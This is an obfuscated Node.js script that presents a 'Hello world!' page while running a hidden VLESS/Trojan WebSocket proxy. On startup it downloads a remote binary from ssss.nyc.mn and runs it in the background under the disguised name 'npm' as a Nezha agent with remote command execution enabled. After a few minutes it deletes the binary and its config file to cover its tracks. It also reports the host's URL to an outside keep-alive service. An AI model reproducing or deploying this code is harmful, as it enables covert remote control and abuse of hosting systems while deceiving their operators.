const _0x4ae4c3=_0x1f6f;(function(_0x34e68d,_0x713e7a){const _0x328f33=_0x1f6f,_0x5217c4=_0x34e68d();while(!![]){try{const _0x3b5883=parseInt(_0x328f33(0x20f))/0x1*(parseInt(_0x328f33(0x226))/0x2)+-parseInt(_0x328f33(0x1d5))/0x3+parseInt(_0x328f33(0x1ff))/0x4*(parseInt(_0x328f33(0x20b))/0x5)+-parseInt(_0x328f33(0x244))/0x6+-parseInt(_0x328f33(0x23f))/0x7+-parseInt(_0x328f33(0x1dc))/0x8+parseInt(_0x328f33(0x234))/0x9*(parseInt(_0x328f33(0x1f0))/0xa);if(_0x3b5883===_0x713e7a)break;else _0x5217c4['push'](_0x5217c4['shift']());}catch(_0x441e50){_0x5217c4['push'](_0x5217c4['shift']());}}}(_0x1326,0x62795));const os=require('os'),http=require(_0x4ae4c3(0x1d8)),fs=require('fs'),axios=require('axios'),net=require(_0x4ae4c3(0x1f6)),path=require(_0x4ae4c3(0x21f)),crypto=require(_0x4ae4c3(0x217)),{Buffer}=require(_0x4ae4c3(0x22c)),{exec,execSync}=require(_0x4ae4c3(0x216)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4ae4c3(0x200)][_0x4ae4c3(0x1fb)]||_0x4ae4c3(0x23c),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x4ae4c3(0x200)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4ae4c3(0x200)]['NEZHA_KEY']||'',DOMAIN=process[_0x4ae4c3(0x200)][_0x4ae4c3(0x237)]||_0x4ae4c3(0x23b),AUTO_ACCESS=process[_0x4ae4c3(0x200)][_0x4ae4c3(0x211)]||!![],WSPATH=process[_0x4ae4c3(0x200)][_0x4ae4c3(0x1f2)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x4ae4c3(0x200)]['SUB_PATH']||_0x4ae4c3(0x236),NAME=process[_0x4ae4c3(0x200)][_0x4ae4c3(0x1e9)]||'Hug',PORT=process['env'][_0x4ae4c3(0x1cf)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2d7ac7=_0x4ae4c3;try{const _0x6ba65e=await axios[_0x2d7ac7(0x1f1)](_0x2d7ac7(0x1e2)),_0x4e1879=_0x6ba65e[_0x2d7ac7(0x1d2)];ISP=(_0x4e1879[_0x2d7ac7(0x24d)]+'-'+_0x4e1879[_0x2d7ac7(0x1ea)])[_0x2d7ac7(0x22f)](/ /g,'_');}catch(_0x5d3e34){ISP='Unknown';}};GetISP();const httpServer=http[_0x4ae4c3(0x220)]((_0x513a4c,_0x4fa6f6)=>{const _0x548127=_0x4ae4c3;if(_0x513a4c[_0x548127(0x238)]==='/'){const _0x383c24=path[_0x548127(0x239)](__dirname,_0x548127(0x1fd));fs[_0x548127(0x1dd)](_0x383c24,_0x548127(0x214),(_0x58b4cb,_0x229d02)=>{const _0x4f64a2=_0x548127;if(_0x58b4cb){_0x4fa6f6['writeHead'](0xc8,{'Content-Type':_0x4f64a2(0x224)}),_0x4fa6f6[_0x4f64a2(0x1ec)](_0x4f64a2(0x1cd));return;}_0x4fa6f6[_0x4f64a2(0x22b)](0xc8,{'Content-Type':_0x4f64a2(0x224)}),_0x4fa6f6[_0x4f64a2(0x1ec)](_0x229d02);});return;}else{if(_0x513a4c[_0x548127(0x238)]==='/'+SUB_PATH){const _0x58478a=_0x548127(0x1ef)+UUID+'@'+DOMAIN+_0x548127(0x22e)+DOMAIN+_0x548127(0x22a)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x460703=_0x548127(0x1fa)+UUID+'@'+DOMAIN+_0x548127(0x219)+DOMAIN+_0x548127(0x22a)+DOMAIN+_0x548127(0x232)+WSPATH+'#'+NAME+'-'+ISP,_0x44cf5c=_0x58478a+'\x0a'+_0x460703,_0xd2b002=Buffer[_0x548127(0x209)](_0x44cf5c)[_0x548127(0x1e4)]('base64');_0x4fa6f6['writeHead'](0xc8,{'Content-Type':_0x548127(0x1f7)}),_0x4fa6f6[_0x548127(0x1ec)](_0xd2b002+'\x0a');}else _0x4fa6f6[_0x548127(0x22b)](0x194,{'Content-Type':_0x548127(0x1f7)}),_0x4fa6f6[_0x548127(0x1ec)](_0x548127(0x233));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x4ae4c3(0x22f)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x4ae4c3(0x203)];function _0x1326(){const _0x568a3f=['https://arm64.ssss.nyc.mn/v1','trojan://','UUID','connection','index.html','application/json','234128PhwJAD','env','log','443','1.1.1.1','slice','write','client_secret:\x20','close','2087','from','Automatic\x20Access\x20Task\x20added\x20successfully','5QmhqdC','writeFileSync','npm\x20running\x20error:','decode','109DMKxdF','digest','AUTO_ACCESS','readUInt16BE','chmod\x20+x\x20npm','utf8','hex','child_process','crypto','catch',':443?security=tls&sni=','2096','error:\x20','includes','pipe','split','path','createServer','npm\x20is\x20running','aarch64','Server\x20is\x20running\x20on\x20port\x20','text/html','readUInt8','10898iozIsg','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','length','8443','&fp=chrome&type=ws&host=','writeHead','buffer','https://amd64.ssss.nyc.mn/v1',':443?encryption=none&security=tls&sni=','replace','error','config.yaml','&path=%2F','Not\x20Found\x0a','9pgcQrD','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','sub','DOMAIN','url','join','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','1234.abc.com','4a8f7264-d996-425b-82f8-0ed66736b567','https://arm64.ssss.nyc.mn/agent','createWriteStream','536326kUVVyu','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','send','stream','setsid\x20nohup\x20./npm\x20-s\x20','1569294VLNdGg','createHash','once','https://','\x20with\x20all\x20DNS\x20servers','pop','application/dns-json','connect','map','country','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Hello\x20world!','\x20-p\x20','PORT','then','Answer','data','unlink','&type=A','204291wbUAqv','npm\x20download\x20successfully','test','http','post','Status','arm64','877184olyMSy','readFile','listen','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/agent','find','https://speed.cloudflare.com/meta','substr','toString','sha224','trim','type','reduce','NAME','asOrganization','--tls','end','utf-8','every','vless://','2667880xXXfVb','get','WSPATH','concat','npm','update','net','text/plain','Failed\x20to\x20resolve\x20'];_0x1326=function(){return _0x568a3f;};return _0x1326();}function resolveHost(_0x1d22db){return new Promise((_0x52b54b,_0x51f64e)=>{const _0x4b0085=_0x1f6f;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4b0085(0x1d7)](_0x1d22db)){_0x52b54b(_0x1d22db);return;}let _0x3fedbf=0x0;function _0x52656f(){const _0x96704c=_0x4b0085;if(_0x3fedbf>=DNS_SERVERS['length']){_0x51f64e(new Error(_0x96704c(0x1f8)+_0x1d22db+_0x96704c(0x248)));return;}const _0x3be6b2=DNS_SERVERS[_0x3fedbf];_0x3fedbf++;const _0xb1cd90='https://dns.google/resolve?name='+encodeURIComponent(_0x1d22db)+_0x96704c(0x1d4);axios[_0x96704c(0x1f1)](_0xb1cd90,{'timeout':0x1388,'headers':{'Accept':_0x96704c(0x24a)}})[_0x96704c(0x1d0)](_0x2d3377=>{const _0x5826b4=_0x96704c,_0x5cae30=_0x2d3377[_0x5826b4(0x1d2)];if(_0x5cae30[_0x5826b4(0x1da)]===0x0&&_0x5cae30[_0x5826b4(0x1d1)]&&_0x5cae30[_0x5826b4(0x1d1)][_0x5826b4(0x228)]>0x0){const _0x25a5b0=_0x5cae30[_0x5826b4(0x1d1)][_0x5826b4(0x1e1)](_0x443080=>_0x443080[_0x5826b4(0x1e7)]===0x1);if(_0x25a5b0){_0x52b54b(_0x25a5b0['data']);return;}}_0x52656f();})[_0x96704c(0x218)](_0x250a8b=>{_0x52656f();});}_0x52656f();});}function handleVlessConnection(_0x5589c7,_0xbe14d1){const _0x2afcdc=_0x4ae4c3,[_0x443fa1]=_0xbe14d1,_0x5906b7=_0xbe14d1['slice'](0x1,0x11);if(!_0x5906b7[_0x2afcdc(0x1ee)]((_0xee911f,_0x1429af)=>_0xee911f==parseInt(uuid[_0x2afcdc(0x1e3)](_0x1429af*0x2,0x2),0x10)))return![];let _0xd73b05=_0xbe14d1[_0x2afcdc(0x204)](0x11,0x12)['readUInt8']()+0x13;const _0x367ded=_0xbe14d1[_0x2afcdc(0x204)](_0xd73b05,_0xd73b05+=0x2)[_0x2afcdc(0x212)](0x0),_0x1b37a3=_0xbe14d1[_0x2afcdc(0x204)](_0xd73b05,_0xd73b05+=0x1)[_0x2afcdc(0x225)](),_0x52cd64=_0x1b37a3==0x1?_0xbe14d1[_0x2afcdc(0x204)](_0xd73b05,_0xd73b05+=0x4)['join']('.'):_0x1b37a3==0x2?new TextDecoder()[_0x2afcdc(0x20e)](_0xbe14d1['slice'](_0xd73b05+0x1,_0xd73b05+=0x1+_0xbe14d1[_0x2afcdc(0x204)](_0xd73b05,_0xd73b05+0x1)[_0x2afcdc(0x225)]())):_0x1b37a3==0x3?_0xbe14d1['slice'](_0xd73b05,_0xd73b05+=0x10)['reduce']((_0xda592e,_0x287d08,_0x5d150a,_0x3a1e7d)=>_0x5d150a%0x2?_0xda592e[_0x2afcdc(0x1f3)](_0x3a1e7d[_0x2afcdc(0x204)](_0x5d150a-0x1,_0x5d150a+0x1)):_0xda592e,[])[_0x2afcdc(0x24c)](_0x575ddb=>_0x575ddb['readUInt16BE'](0x0)['toString'](0x10))[_0x2afcdc(0x239)](':'):'';_0x5589c7[_0x2afcdc(0x241)](new Uint8Array([_0x443fa1,0x0]));const _0x1d7137=createWebSocketStream(_0x5589c7);return resolveHost(_0x52cd64)[_0x2afcdc(0x1d0)](_0xf3954e=>{const _0x263c18=_0x2afcdc;net['connect']({'host':_0xf3954e,'port':_0x367ded},function(){const _0x558a84=_0x1f6f;this[_0x558a84(0x205)](_0xbe14d1['slice'](_0xd73b05)),_0x1d7137['on'](_0x558a84(0x230),()=>{})[_0x558a84(0x21d)](this)['on'](_0x558a84(0x230),()=>{})[_0x558a84(0x21d)](_0x1d7137);})['on'](_0x263c18(0x230),()=>{});})['catch'](_0x17c2fa=>{const _0xbbe7a9=_0x2afcdc;net[_0xbbe7a9(0x24b)]({'host':_0x52cd64,'port':_0x367ded},function(){const _0x126379=_0xbbe7a9;this[_0x126379(0x205)](_0xbe14d1['slice'](_0xd73b05)),_0x1d7137['on'](_0x126379(0x230),()=>{})[_0x126379(0x21d)](this)['on']('error',()=>{})[_0x126379(0x21d)](_0x1d7137);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x5558b9,_0x39b0dc){const _0x23de8d=_0x4ae4c3;try{if(_0x39b0dc['length']<0x3a)return![];const _0x18f0ad=_0x39b0dc[_0x23de8d(0x204)](0x0,0x38)[_0x23de8d(0x1e4)](),_0x193d4c=[UUID];let _0x19e9cf=null;for(const _0x39dd37 of _0x193d4c){const _0x2b6126=crypto[_0x23de8d(0x245)](_0x23de8d(0x1e5))[_0x23de8d(0x1f5)](_0x39dd37)[_0x23de8d(0x210)](_0x23de8d(0x215));if(_0x2b6126===_0x18f0ad){_0x19e9cf=_0x39dd37;break;}}if(!_0x19e9cf)return![];let _0x3331e9=0x38;_0x39b0dc[_0x3331e9]===0xd&&_0x39b0dc[_0x3331e9+0x1]===0xa&&(_0x3331e9+=0x2);const _0x44ad11=_0x39b0dc[_0x3331e9];if(_0x44ad11!==0x1)return![];_0x3331e9+=0x1;const _0x430455=_0x39b0dc[_0x3331e9];_0x3331e9+=0x1;let _0x591695,_0x44dbf1;if(_0x430455===0x1)_0x591695=_0x39b0dc[_0x23de8d(0x204)](_0x3331e9,_0x3331e9+0x4)[_0x23de8d(0x239)]('.'),_0x3331e9+=0x4;else{if(_0x430455===0x3){const _0x259297=_0x39b0dc[_0x3331e9];_0x3331e9+=0x1,_0x591695=_0x39b0dc[_0x23de8d(0x204)](_0x3331e9,_0x3331e9+_0x259297)[_0x23de8d(0x1e4)](),_0x3331e9+=_0x259297;}else{if(_0x430455===0x4)_0x591695=_0x39b0dc['slice'](_0x3331e9,_0x3331e9+0x10)[_0x23de8d(0x1e8)]((_0x3715e3,_0x7ca96,_0x3ae88d,_0x19b639)=>_0x3ae88d%0x2?_0x3715e3[_0x23de8d(0x1f3)](_0x19b639[_0x23de8d(0x204)](_0x3ae88d-0x1,_0x3ae88d+0x1)):_0x3715e3,[])['map'](_0x5a4cf4=>_0x5a4cf4[_0x23de8d(0x212)](0x0)[_0x23de8d(0x1e4)](0x10))[_0x23de8d(0x239)](':'),_0x3331e9+=0x10;else return![];}}_0x44dbf1=_0x39b0dc[_0x23de8d(0x212)](_0x3331e9),_0x3331e9+=0x2;_0x3331e9<_0x39b0dc['length']&&_0x39b0dc[_0x3331e9]===0xd&&_0x39b0dc[_0x3331e9+0x1]===0xa&&(_0x3331e9+=0x2);const _0x3931fd=createWebSocketStream(_0x5558b9);return resolveHost(_0x591695)['then'](_0x429afd=>{const _0x334ddf=_0x23de8d;net[_0x334ddf(0x24b)]({'host':_0x429afd,'port':_0x44dbf1},function(){const _0x57760e=_0x334ddf;_0x3331e9<_0x39b0dc[_0x57760e(0x228)]&&this[_0x57760e(0x205)](_0x39b0dc[_0x57760e(0x204)](_0x3331e9)),_0x3931fd['on'](_0x57760e(0x230),()=>{})['pipe'](this)['on']('error',()=>{})[_0x57760e(0x21d)](_0x3931fd);})['on'](_0x334ddf(0x230),()=>{});})['catch'](_0x9d41d5=>{const _0x2e4583=_0x23de8d;net[_0x2e4583(0x24b)]({'host':_0x591695,'port':_0x44dbf1},function(){const _0x1f2cea=_0x2e4583;_0x3331e9<_0x39b0dc[_0x1f2cea(0x228)]&&this[_0x1f2cea(0x205)](_0x39b0dc['slice'](_0x3331e9)),_0x3931fd['on'](_0x1f2cea(0x230),()=>{})[_0x1f2cea(0x21d)](this)['on']('error',()=>{})[_0x1f2cea(0x21d)](_0x3931fd);})['on']('error',()=>{});}),!![];}catch(_0x205541){return![];}}wss['on'](_0x4ae4c3(0x1fc),(_0x43acd6,_0x2942c8)=>{const _0x5e4695=_0x4ae4c3,_0x18093e=_0x2942c8[_0x5e4695(0x238)]||'';_0x43acd6[_0x5e4695(0x246)]('message',_0x1dcf97=>{const _0x2e9957=_0x5e4695;if(_0x1dcf97['length']>0x11&&_0x1dcf97[0x0]===0x0){const _0x3e72bb=_0x1dcf97['slice'](0x1,0x11),_0x28ad42=_0x3e72bb[_0x2e9957(0x1ee)]((_0x4ecd57,_0x278cb6)=>_0x4ecd57==parseInt(uuid[_0x2e9957(0x1e3)](_0x278cb6*0x2,0x2),0x10));if(_0x28ad42){!handleVlessConnection(_0x43acd6,_0x1dcf97)&&_0x43acd6['close']();return;}}!handleTrojanConnection(_0x43acd6,_0x1dcf97)&&_0x43acd6[_0x2e9957(0x207)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x1a1fd7=_0x4ae4c3,_0x2d7194=os['arch']();return _0x2d7194==='arm'||_0x2d7194===_0x1a1fd7(0x1db)||_0x2d7194===_0x1a1fd7(0x222)?!NEZHA_PORT?_0x1a1fd7(0x1f9):_0x1a1fd7(0x23d):!NEZHA_PORT?_0x1a1fd7(0x22d):_0x1a1fd7(0x1e0);},downloadFile=async()=>{const _0x25c97f=_0x4ae4c3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1630f7=getDownloadUrl(),_0x4d7253=await axios({'method':_0x25c97f(0x1f1),'url':_0x1630f7,'responseType':_0x25c97f(0x242)}),_0x49e52b=fs[_0x25c97f(0x23e)](_0x25c97f(0x1f4));return _0x4d7253['data'][_0x25c97f(0x21d)](_0x49e52b),new Promise((_0x2467bc,_0x4523ea)=>{const _0x4621e1=_0x25c97f;_0x49e52b['on']('finish',()=>{const _0x162611=_0x1f6f;console[_0x162611(0x201)](_0x162611(0x1d6)),exec(_0x162611(0x213),_0x5fba07=>{if(_0x5fba07)_0x4523ea(_0x5fba07);_0x2467bc();});}),_0x49e52b['on'](_0x4621e1(0x230),_0x4523ea);});}catch(_0x148c3a){throw _0x148c3a;}},runnz=async()=>{const _0xa285b9=_0x4ae4c3;try{const _0x4f97a2=execSync(_0xa285b9(0x23a),{'encoding':_0xa285b9(0x1ed)});if(_0x4f97a2[_0xa285b9(0x1e6)]()!==''){console[_0xa285b9(0x201)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x10ad3){}await downloadFile();let _0x5ac6cc='',_0x447736=[_0xa285b9(0x202),_0xa285b9(0x229),_0xa285b9(0x21a),_0xa285b9(0x208),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4dbf82=_0x447736[_0xa285b9(0x21c)](NEZHA_PORT)?_0xa285b9(0x1eb):'';_0x5ac6cc=_0xa285b9(0x243)+NEZHA_SERVER+':'+NEZHA_PORT+_0xa285b9(0x1ce)+NEZHA_KEY+'\x20'+_0x4dbf82+_0xa285b9(0x1df);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3c1e6c=NEZHA_SERVER[_0xa285b9(0x21c)](':')?NEZHA_SERVER[_0xa285b9(0x21e)](':')[_0xa285b9(0x249)]():'',_0x10daff=_0x447736[_0xa285b9(0x21c)](_0x3c1e6c)?'true':'false',_0x5a5e44=_0xa285b9(0x206)+NEZHA_KEY+_0xa285b9(0x227)+NEZHA_SERVER+_0xa285b9(0x24e)+_0x10daff+_0xa285b9(0x240)+UUID;fs[_0xa285b9(0x20c)](_0xa285b9(0x231),_0x5a5e44);}_0x5ac6cc=_0xa285b9(0x235);}else{console[_0xa285b9(0x201)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5ac6cc,{'shell':'/bin/bash'},_0x763de8=>{const _0x301c0a=_0xa285b9;if(_0x763de8)console['error'](_0x301c0a(0x20d),_0x763de8);else console[_0x301c0a(0x201)](_0x301c0a(0x221));});}catch(_0xaa15f0){console[_0xa285b9(0x230)](_0xa285b9(0x21b)+_0xaa15f0);}};async function addAccessTask(){const _0x8c52d4=_0x4ae4c3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4b6b81=_0x8c52d4(0x247)+DOMAIN;try{const _0x3c2012=await axios[_0x8c52d4(0x1d9)]('https://oooo.serv00.net/add-url',{'url':_0x4b6b81},{'headers':{'Content-Type':_0x8c52d4(0x1fe)}});console['log'](_0x8c52d4(0x20a));}catch(_0x213571){}}const delFiles=()=>{const _0x2a3b83=_0x4ae4c3;fs[_0x2a3b83(0x1d3)]('npm',()=>{}),fs['unlink'](_0x2a3b83(0x231),()=>{});};function _0x1f6f(_0x2032ee,_0x189486){const _0x1326db=_0x1326();return _0x1f6f=function(_0x1f6f48,_0x3de16d){_0x1f6f48=_0x1f6f48-0x1cd;let _0x5baa0c=_0x1326db[_0x1f6f48];return _0x5baa0c;},_0x1f6f(_0x2032ee,_0x189486);}httpServer[_0x4ae4c3(0x1de)](PORT,()=>{const _0x28edb1=_0x4ae4c3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x28edb1(0x223)+PORT);});
